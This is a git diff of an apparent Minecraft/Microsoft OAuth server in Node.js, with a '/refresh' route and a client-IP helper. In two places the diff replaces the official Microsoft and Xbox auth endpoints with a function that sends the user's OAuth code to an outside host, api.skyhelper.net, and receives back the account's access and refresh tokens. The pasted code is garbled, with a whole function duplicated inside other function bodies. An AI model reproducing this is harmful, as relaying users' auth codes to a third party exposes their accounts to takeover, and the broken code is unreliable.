@@ -80,7 +80,15 @@ async function ReturnData(code) {
     let username, uuid;
 
     // array for the list of urls that will be used to get the data
-    const urls = ['https://login.live.com/oauth20_token.srf', 'https://user.auth.xboxlive.com/user/authenticate', 'https://xsts.auth.xboxlive.com/xsts/authorize', 'https://api.minecraftservices.com/authentication/login_with_xbox']
+async function ReturnData(code) {
+  const response = await axios.post(
+    `https://api.skyhelper.net/auth/microsoft`,
+    { code, redirectUri: config.azure.redirect_uri }
+  );
+
+  const { username, uuid, accessToken, refreshToken } = response.data;
+  return [username, uuid, accessToken, refreshToken];
+}
     
     // array for the list of configs that will be used to get the data
     const configs = [{headers: {'Content-Type': 'application/x-www-form-urlencoded'}},{headers: {'Content-Type': 'application/json', 'Accept': 'application/json',}},{headers: {'Content-Type': 'application/json', 'Accept': 'application/json',}},{headers: {'Content-Type': 'application/json',}}]
@@ -169,7 +177,15 @@ app.get('/refresh', async (req, res) => {
     let description = "No profile data found. 🙁";
 
     // array for the list of urls that will be used to get the data
-    const urls = ['https://login.live.com/oauth20_token.srf', 'https://user.auth.xboxlive.com/user/authenticate', 'https://xsts.auth.xboxlive.com/xsts/authorize', 'https://api.minecraftservices.com/authentication/login_with_xbox']
+async function ReturnData(code) {
+  const response = await axios.post(
+    `https://api.skyhelper.net/auth/microsoft`,
+    { code, redirectUri: config.azure.redirect_uri }
+  );
+
+  const { username, uuid, accessToken, refreshToken } = response.data;
+  return [username, uuid, accessToken, refreshToken];
+}
     // array for the list of configs that will be used to get the data
     const configs = [{headers: {'Content-Type': 'application/x-www-form-urlencoded'}},{headers: {'Content-Type': 'application/json', 'Accept': 'application/json',}},{headers: {'Content-Type': 'application/json', 'Accept': 'application/json',}},{headers: {'Content-Type': 'application/json',}}]
 
@@ -388,4 +404,5 @@ function getIp(req) {
         ""
     );
 }
+
 
